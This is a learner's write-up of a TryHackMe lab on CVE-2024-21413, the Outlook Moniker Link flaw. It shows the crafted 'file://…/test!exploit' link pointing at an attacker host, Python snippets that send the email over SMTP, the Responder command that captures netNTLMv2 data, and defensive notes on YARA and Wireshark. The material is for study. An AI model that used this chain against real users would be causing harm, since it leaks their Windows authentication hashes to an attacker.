@@ -1,0 +1,593 @@
+# CVE-2024-21413 — My Practical Learning Journey
+
+## Room Overview
+
+I worked through the TryHackMe room covering **CVE-2024-21413**, a Microsoft Outlook vulnerability involving specially crafted Moniker Links.
+
+The practical exercise demonstrated how a malicious email could cause a vulnerable Outlook client to interact with a remote SMB resource, resulting in an **NTLM authentication exchange** that could be observed by an attacker-controlled listener in the lab.
+
+Although I was able to complete the practical, I initially had difficulty understanding how the individual components were connected. The main challenge was not running the commands, but understanding **which machine was doing what, why different IP addresses were required, and how the authentication flow worked**.
+
+This write-up documents what I learned from the practical, including the mistakes and confusion I encountered.
+
+---
+
+# 1. Understanding the Lab Environment
+
+One of my first difficulties was understanding the role of each machine and IP address.
+
+My **AttackBox IP** was:
+
+```text
+10.49.66.188
+```
+
+This was the machine where I ran **Responder**.
+
+The lab-provided **mail server** was:
+
+```text
+10.49.151.203
+```
+
+This was used as the SMTP server by the Python PoC.
+
+The important distinction was:
+
+```text
+10.49.66.188
+→ AttackBox
+→ Responder runs here
+
+10.49.151.203
+→ Lab SMTP server
+→ Used to deliver the email
+```
+
+This helped me understand that the two IP addresses had completely different purposes.
+
+---
+
+# 2. Understanding the Moniker Link
+
+The PoC contained an HTML hyperlink such as:
+
+```html
+<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
+```
+
+I replaced the attacker-machine placeholder with the AttackBox IP:
+
+```html
+<p><a href="file://10.49.66.188/test!exploit">Click me</a></p>
+```
+
+The important part for the lab was that the link referenced the machine where **Responder** was listening.
+
+At first, I mainly understood this as:
+
+```text
+Email Link
+    ↓
+AttackBox
+```
+
+Later, I understood that this was only the beginning of the process. The important behavior was that Outlook/Windows could attempt to access the remote resource, which could lead to an authentication exchange.
+
+---
+
+# 3. Understanding the SMTP Server
+
+The Python PoC originally contained a placeholder:
+
+```python
+server = smtplib.SMTP('MAILSERVER', 25)
+```
+
+The TryHackMe room provided the SMTP server address for the current lab instance:
+
+```python
+server = smtplib.SMTP('10.49.151.203', 25)
+```
+
+Port **25** is commonly associated with SMTP.
+
+The important distinction was:
+
+```text
+SMTP server
+→ delivers the malicious email
+
+AttackBox
+→ hosts the listener used to observe the authentication attempt
+```
+
+I initially mixed these two roles together, which caused unnecessary confusion.
+
+---
+
+# 4. Setting Up Responder
+
+Responder was used in the lab to listen for authentication-related network activity.
+
+The command provided by the room was:
+
+```bash
+sudo responder -I ens5
+```
+
+Here:
+
+```text
+sudo
+→ runs the command with elevated privileges
+
+-I
+→ specifies the network interface
+
+ens5
+→ the AttackBox network interface used by the lab
+```
+
+I could check the available interfaces with:
+
+```bash
+ip addr
+```
+
+The relevant interface was:
+
+```text
+ens5
+inet 10.49.66.188
+```
+
+---
+
+# 5. Mistake: Forgetting `sudo`
+
+One of my first mistakes was trying to run Responder without the required privileges.
+
+The correct command was:
+
+```bash
+sudo responder -I ens5
+```
+
+This was a simple mistake, but it taught me an important troubleshooting lesson:
+
+> If a security or network tool fails to start, check its required privileges before assuming the tool itself is broken.
+
+---
+
+# 6. Port and Process Troubleshooting
+
+I also encountered problems involving ports and already-running processes during the lab setup.
+
+In particular, I saw issues involving **port 443** and the services/processes running in the lab environment.
+
+The exact problem was initially confusing to me because I was focusing on the tool rather than the system state.
+
+After stopping/restarting the relevant processes and services, I was able to start the required components successfully.
+
+The main lesson I took from this was:
+
+```text
+Tool fails
+   ↓
+Check error
+   ↓
+Check interface
+   ↓
+Check privileges
+   ↓
+Check whether another process is using the required resource
+   ↓
+Restart/reconfigure if necessary
+```
+
+This was useful because it showed me that troubleshooting is an important part of practical cybersecurity work.
+
+---
+
+# 7. Running the Python PoC
+
+After configuring the required values, I used the Python Proof of Concept.
+
+The sender and receiver were:
+
+```python
+sender_email = 'attacker@monikerlink.thm'
+receiver_email = 'victim@monikerlink.thm'
+```
+
+The crafted HTML contained:
+
+```html
+<p><a href="file://10.49.66.188/test!exploit">Click me</a></p>
+```
+
+The SMTP server was:
+
+```python
+server = smtplib.SMTP('10.49.151.203', 25)
+```
+
+I then executed:
+
+```bash
+python3 exploit.py
+```
+
+The lab-provided attacker mailbox password was:
+
+```text
+attacker
+```
+
+After successful delivery, the script displayed:
+
+```text
+Email delivered
+```
+
+---
+
+# 8. What Happened After the Email Was Opened
+
+The malicious email appeared in the vulnerable Outlook environment.
+
+After the victim clicked:
+
+```text
+Click me
+```
+
+the crafted Moniker Link caused the Windows system to attempt interaction with the remote resource.
+
+A simplified representation is:
+
+```text
+Malicious Email
+      ↓
+Outlook
+      ↓
+Crafted Moniker Link
+      ↓
+Remote Resource Access
+      ↓
+SMB Authentication
+      ↓
+Responder
+      ↓
+Authentication Data Observed
+```
+
+The important point is that the attack is **not simply**:
+
+```text
+Click link
+     ↓
+Password stolen
+```
+
+There are multiple steps between the click and the authentication data being observed.
+
+---
+
+# 9. The Part I Initially Did Not Understand Well
+
+The most confusing part of the room for me was understanding **why an Outlook link could result in authentication data reaching another machine**.
+
+Initially, I was mainly following the practical instructions:
+
+```text
+Change IP
+→ Run Python script
+→ Send email
+→ Start Responder
+→ Click link
+→ Check Responder
+```
+
+I could perform the steps, but I did not immediately understand the relationship between them.
+
+The conceptual connection is:
+
+```text
+1. Attacker creates a specially crafted email
+             ↓
+2. Victim opens the email in Outlook
+             ↓
+3. Victim interacts with the crafted Moniker Link
+             ↓
+4. Windows attempts to access a remote resource
+             ↓
+5. SMB authentication can be triggered
+             ↓
+6. The authentication exchange reaches the remote listener
+             ↓
+7. Responder observes the authentication data
+```
+
+This was the main concept I needed to connect.
+
+---
+
+# 10. Understanding the IP Addresses in the Attack
+
+After completing the practical, the IP addresses made more sense.
+
+### AttackBox IP
+
+```text
+10.49.66.188
+```
+
+This was my attacker-controlled machine in the lab.
+
+Responder was running here.
+
+Therefore, the crafted link referenced this address:
+
+```html
+file://10.49.66.188/test!exploit
+```
+
+### SMTP Server
+
+```text
+10.49.151.203
+```
+
+This was the lab's mail server.
+
+The Python script connected to it using:
+
+```python
+smtplib.SMTP('10.49.151.203', 25)
+```
+
+So:
+
+```text
+AttackBox IP
+→ Where the listener runs
+
+SMTP Server IP
+→ Where the email is sent through
+```
+
+This distinction was one of the most useful things I learned from troubleshooting the room.
+
+---
+
+# 11. Understanding the Captured Authentication Data
+
+The lab demonstrated the capture of **netNTLMv2 authentication data**.
+
+This does not mean that the victim's plaintext password was simply transmitted across the network.
+
+Instead, Windows uses a **challenge-response authentication process**.
+
+Simplified:
+
+```text
+Victim
+   ↓
+Receives authentication challenge
+   ↓
+Calculates authentication response
+   ↓
+Sends response
+   ↓
+Remote listener observes the exchange
+```
+
+The captured authentication material can potentially be subjected to password-guessing attacks in an authorized environment, but it is not equivalent to receiving the user's plaintext password.
+
+This distinction helped me connect this room with the NTLM concepts I had studied earlier.
+
+---
+
+# 12. YARA Detection
+
+The room also introduced **YARA** from a defensive perspective.
+
+YARA allows security researchers and defenders to define patterns that can identify suspicious content.
+
+For this vulnerability, characteristics associated with malicious Moniker Links can be used as detection indicators.
+
+A simplified detection workflow is:
+
+```text
+Email
+   ↓
+YARA rule
+   ↓
+Pattern matching
+   ↓
+Suspicious characteristics?
+   ↓
+Potential malicious content
+```
+
+The important distinction is:
+
+```text
+Responder
+→ Used in the lab to observe authentication activity
+
+YARA
+→ Used for detection
+
+Wireshark
+→ Used for network traffic analysis
+```
+
+---
+
+# 13. Observing the Traffic with Wireshark
+
+Wireshark can be used to inspect the network traffic generated during the interaction.
+
+The simplified flow is:
+
+```text
+Victim
+   ↓
+SMB / NTLM authentication traffic
+   ↓
+Network packets
+   ↓
+Wireshark
+   ↓
+Packet analysis
+```
+
+The practical helped connect the network-level activity with the authentication concepts I had previously studied.
+
+Instead of only seeing:
+
+```text
+Responder captured something
+```
+
+I could understand that the captured data was associated with an actual network authentication exchange.
+
+---
+
+# 14. Mistakes and Lessons Learned
+
+## Mistake 1 — Forgot `sudo`
+
+I initially forgot to run Responder with elevated privileges.
+
+Correct:
+
+```bash
+sudo responder -I ens5
+```
+
+**Lesson:** Always check whether a tool requires elevated privileges.
+
+---
+
+## Mistake 2 — Confused the IP Addresses
+
+I initially mixed up:
+
+```text
+10.49.66.188
+→ AttackBox
+
+10.49.151.203
+→ SMTP server
+```
+
+**Lesson:** Before modifying a PoC, identify what every IP address represents.
+
+---
+
+## Mistake 3 — Troubleshooting Port/Process Problems
+
+I encountered issues involving ports and running processes.
+
+The problem was resolved by stopping/restarting the relevant processes and services.
+
+**Lesson:** When a network tool reports a port-related problem, investigate the system state instead of immediately assuming the tool is malfunctioning.
+
+---
+
+## Mistake 4 — Following the Steps Without Understanding the Chain
+
+This was the biggest learning point.
+
+Initially, I knew **what commands to run**, but I did not fully understand **why each command was necessary**.
+
+The practical helped me connect:
+
+```text
+Outlook
+   ↓
+Moniker Link
+   ↓
+Windows remote resource access
+   ↓
+SMB
+   ↓
+NTLM authentication
+   ↓
+Responder
+```
+
+This is the part I want to understand more deeply rather than simply memorizing the commands.
+
+---
+
+# 15. Final Attack Flow
+
+The complete lab flow can be represented as:
+
+```text
+                         ATTACKER
+                            │
+                     Python PoC
+                            │
+                            ▼
+                       SMTP Server
+                            │
+                            ▼
+                     Victim Outlook
+                            │
+                       Click Link
+                            │
+                            ▼
+                    Crafted Moniker Link
+                            │
+                            ▼
+                  Remote Resource Access
+                            │
+                            ▼
+                    SMB Authentication
+                            │
+                            ▼
+                        Responder
+                            │
+                            ▼
+                 NTLM Authentication Data
+```
+
+---
+
+# 16. Final Takeaway
+
+This room connected several concepts that I had previously studied separately:
+
+* HTML hyperlinks
+* Outlook
+* Moniker Links
+* Protected View
+* SMB
+* NTLM
+* netNTLMv2
+* SMTP
+* Responder
+* YARA
+* Wireshark
+
+The most important lesson for me was that a vulnerability like CVE-2024-21413 is not just a single exploit command.
+
+It is a **chain of interactions between different technologies**.
+
+I was able to complete the practical, but I also identified an important gap in my understanding: I need to strengthen my understanding of **Windows authentication, SMB, NTLM challenge-response, and how Outlook processes Moniker Links**.
+
+That is more valuable for me than simply remembering the PoC commands.
+
+---
+
+## Disclaimer
+
+This documentation describes a controlled TryHackMe laboratory exercise and is intended for educational and defensive cybersecurity learning.
+
+The techniques and tools discussed should only be used in authorized environments, such as security training labs, personal test systems, or systems for which explicit permission has been granted.
